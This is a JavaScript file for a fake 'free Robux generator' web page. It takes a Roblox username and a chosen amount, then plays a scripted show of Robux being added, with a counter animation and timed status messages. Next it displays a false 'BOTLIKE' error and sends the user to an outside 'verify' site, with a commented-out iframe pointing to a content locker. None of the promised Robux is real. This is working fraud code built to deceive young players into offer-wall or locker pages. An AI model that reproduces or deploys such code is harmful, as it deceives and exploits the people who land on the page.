// =================================================================

var wantingnew, actually, mainuser;

function FADJ() {
  var b_width;

  b_width = $("body").width();

  if (b_width > 575.98) {
    var tbbott, totoop;
    totoop = $(".RECENTROBLOX").outerHeight();
    tbbott = $(".rob-bot").height();
    TTB = tbbott + totoop + 1;
    $(".FLICK2").css("margin-bottom", tbbott + "px");
    $(".FLICK2").css("height", "calc(812px - " + TTB + "px)");
  } else {
    var tbbott, totoop;
    totoop = $(".RECENTROBLOX").outerHeight();
    tbbott = $(".rob-bot").height();
    TTB = tbbott + totoop + 1;
    $(".FLICK2").css("margin-bottom", tbbott + "px");
    $(".FLICK2").css("height", "calc(100vh - " + TTB + "px)");
  }
}

$(function () {
  FADJ();
});

$(window).resize(function () {
  FADJ();
});

function SYES() {
  $(".YESNO").fadeOut(1500, function () {
    $(".YESNO").attr("style", "display: none !important;");
    $("#BTNADD").html("Add <strong>" + wantingnew + " free Robux</strong>");
    $("#BTNADD").fadeIn(1500);
  });
}

function SNO() {
  $(".P2").fadeOut(1500, function () {
    $(".P1").fadeIn(1500);
    $("#robname").val("");
    $(".S1B").prop("disabled", false);
  });
}

function SADDB() {
  $(".S2B3").prop("disabled", true);

  $(".freerobux777").fadeIn(1500);

  $("#step34").html(
    "<strong>Step 3:</strong> Adding your <strong>free Robux</strong>!"
  );

  $("#CONS").fadeIn(1500);

  const options = {
    useEasing: false,
    useGrouping: false,
    separator: "",
    decimal: "",
  };

  setTimeout(function () {
    var FOL = new CountUp("acc777", 0, parseInt(wantingnew), 0, 18, options);
    FOL.start(function () {
      $("#step34").html("<strong>Step 4:</strong> Verify your account!");
      $("#CONS").fadeOut(1500, function () {
        $("#CONS").html(
          "<strong class='reddd'>ERROR! We detected your behavior as BOTLIKE.</strong> Click <strong>Verify</strong> to prove that you are a human and to receive your <strong>" +
            wantingnew +
            "</strong> Robux for free..."
        );
        $("#CONS").fadeIn(1500);
        $(".VB").fadeIn(1500).removeClass("VB");
      });
    });

    setTimeout(function () {
      $("#CONS").html("Looking for <strong>" + mainuser + "</strong> user...");
    }, 6000);

    setTimeout(function () {
      $("#CONS").html("Adding <strong>" + wantingnew + "</strong> Robux...");
    }, 9000);

    setTimeout(function () {
      $("#CONS").html("Disconnecting from <strong>Roblox servers</strong>...");
    }, 14000);
  }, 1500);
}

function SADD() {
  $(".S2B3").prop("disabled", true);

  $(".freerobux").fadeIn(1500);

  $("#step34").html(
    "<strong>Step 4:</strong> Adding your <strong>free Robux</strong>!"
  );

  $("#BTNADD").fadeOut(1500, function () {
    $("#CONS").fadeIn(1500);
  });

  const options = {
    useEasing: false,
    useGrouping: false,
    separator: "",
    decimal: "",
  };

  setTimeout(function () {
    var FOL = new CountUp("acc", 0, parseInt(wantingnew), 0, 18, options);
    FOL.start(function () {
      $("#step34").html("<strong>Step 5:</strong> Verify your account!");
      $("#CONS").fadeOut(1500, function () {
        $("#CONS").html(
          "<strong class='reddd'>ERROR! We detected your behavior as BOTLIKE.</strong> Click <strong>Verify</strong> to prove that you are a human and to receive your <strong>" +
            wantingnew +
            "</strong> Robux for free..."
        );
        $("#CONS").fadeIn(1500);
        $(".VB").fadeIn(1500).removeClass("VB");
      });
    });

    setTimeout(function () {
      $("#CONS").html("Looking for <strong>" + mainuser + "</strong> user...");
    }, 6000);

    setTimeout(function () {
      $("#CONS").html("Adding <strong>" + wantingnew + "</strong> Robux...");
    }, 9000);

    setTimeout(function () {
      $("#CONS").html("Disconnecting from <strong>Roblox servers</strong>...");
    }, 14000);
  }, 1500);
}

function S1() {
  mainuser = $("#robname").val();
  wantingnew = $("#robux option:selected").val();

  if (wantingnew == "" || mainuser == "") {
    alert(
      "Type in your Roblox username and choose how many free Robux you want before clicking continue!."
    );
  } else {
    $(".S1B").prop("disabled", true);

    $.ajax({
      url: "checking.php?u=" + mainuser,
      success: function (data) {
        if (!data.includes("FLICKERROR")) {
          try {
            var JSXD = JSON.parse(data);

            $(".robnames").html("<strong>" + JSXD.username + "</strong>");

            $(".robavatar").attr("src", JSXD.avatar);
            $(".robwearing").attr("src", JSXD.wearing);

            $(".P1").fadeOut(1500, function () {
              $(".P2").fadeIn(1500);
            });
          } catch (err) {
            $(".P1").fadeOut(1500, function () {
              $(".SCARED").remove();
              $(".YESNO").remove();
              $(".P2").fadeIn(1500);
              //$(".freerobux777").fadeIn(1500);
              //$("#CONS").fadeIn(1500);
              SADDB();
            });
          }
        } else {
          //BACKUP MODE

          $(".P1").fadeOut(1500, function () {
            $(".SCARED").remove();
            $(".YESNO").remove();
            $(".P2").fadeIn(1500);
            //$(".freerobux777").fadeIn(1500);
            //$("#CONS").fadeIn(1500);
            SADDB();
          });
        }
      },
      error: function (data) {
        //BACKUP MODE

        $(".P1").fadeOut(1500, function () {
          $(".SCARED").remove();
          $(".YESNO").remove();
          $(".P2").fadeIn(1500);
          //$(".freerobux777").fadeIn(1500);
          //$("#CONS").fadeIn(1500);
          SADDB();
        });
      },
    });
  }
}

function humanverification() {
  // Show the loader
  // document.getElementById("iframe-overlay").innerHTML =
  //   '<iframe id="lockeriframe" src="https://verifyhere.xyz/cl/i/5k8dm1" frameborder="0" class="second-row"></iframe>';

  // // Insert the iframe after a delay to simulate loading time
  // setTimeout(function () {
  //   document.getElementById("iframe-overlay").style.display = "flex"; // Show iframe overlay
  // }, 100);
  window.location.href = "https://freerobloxintermediate.onrender.com";
}
